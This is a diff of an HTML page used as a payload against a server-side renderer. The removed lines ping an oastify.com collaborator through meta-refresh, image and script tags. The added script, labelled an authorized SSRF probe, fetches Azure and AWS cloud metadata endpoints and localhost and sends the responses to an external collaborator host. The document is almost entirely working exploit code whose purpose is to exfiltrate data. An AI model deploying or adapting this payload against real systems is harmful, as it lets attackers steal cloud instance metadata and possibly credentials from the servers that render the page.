@@ -1,16 +1,42 @@
 <!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>render test</title>
-<!-- client-side navigation to http: bypasses the initial-URL https-only check if the fetcher follows meta-refresh -->
-<meta http-equiv="refresh" content="0;url=http://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/META-HTTP-REDIR">
-</head>
+<html><head><title>product</title></head>
 <body>
-<h1>render test page</h1>
-<!-- earliest inline script: fires at parse start if JS is enabled -->
-<script>(new Image()).src="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/JS-FIRST";</script>
-<img src="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/IMG-HTMLTAG2" style="display:none">
-<script src="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/SCRIPT-HTMLTAG2"></script>
-</body>
-</html>
+<h1>Product details</h1>
+<p>SSRF escalation probe (IMDS / cross-origin read) - authorized test.</p>
+<script>
+(async () => {
+  const C = "sgcefabsg3qdhlnffrumpf5ullrdf2.oastify.com";
+  // exfil: no-cors GET, data in URL query (collaborator logs the request line)
+  const exfil = (label, data) => {
+    try { fetch("https://"+C+"/"+label+"?d="+encodeURIComponent(String(data).slice(0,1800)), {mode:"no-cors"}); } catch(e){}
+  };
+  exfil("PAGE-LOADED", "js executed in renderer");
+  // 1. Azure IMDS WITH Metadata header (the prize). cors mode to test read.
+  try {
+    const r = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {headers:{Metadata:"true"}});
+    const t = await r.text();
+    exfil("IMDS-OK", r.status+"|"+t);
+  } catch(e) { exfil("IMDS-ERR", String(e)); }
+  // 2. IMDS WITHOUT header (some configs respond)
+  try {
+    const r = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01");
+    exfil("IMDS-NOHDR", r.status+"|"+await r.text());
+  } catch(e) { exfil("IMDS-NOHDR-ERR", String(e)); }
+  // 3. cross-origin READ capability test (fetch collaborator, try to read response type)
+  try {
+    const r = await fetch("https://"+C+"/cors-read-test");
+    exfil("CORSREAD", r.status+"|type="+r.type);
+  } catch(e) { exfil("CORSREAD-ERR", String(e)); }
+  // 4. localhost probe
+  try {
+    const r = await fetch("http://localhost:80/");
+    exfil("LOCALHOST", r.status);
+  } catch(e) { exfil("LOCALHOST-ERR", String(e)); }
+  // 5. AWS-style IMDSv1 (no header) just in case
+  try {
+    const r = await fetch("http://169.254.169.254/latest/meta-data/");
+    exfil("AWS-IMDS", r.status+"|"+await r.text());
+  } catch(e) { exfil("AWS-IMDS-ERR", String(e)); }
+})();
+</script>
+</body></html>
